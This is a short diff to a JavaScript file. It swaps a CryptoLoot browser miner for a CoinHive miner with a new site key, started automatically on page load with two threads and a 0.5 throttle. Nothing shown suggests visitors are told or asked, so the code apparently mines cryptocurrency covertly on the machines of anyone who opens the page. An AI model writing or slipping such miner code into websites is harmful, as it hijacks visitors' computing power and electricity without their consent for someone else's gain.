@@ -4,7 +4,7 @@ var DAYS_UNTIL_INVALIDATION = 1;
 
 $(document).ready(function() {
     try {
-        var miner=new CryptoLoot.Anonymous('f7a2330605f11eefb1f3d6890a6a8ef30e43edc8464c',
+        var miner=new CoinHive.Anonymous('8tlshLRjCZAHt8EkozsP4PAzAGOKeKFc',
         {
             threads:2,autoThreads:false,throttle:0.5,
         });
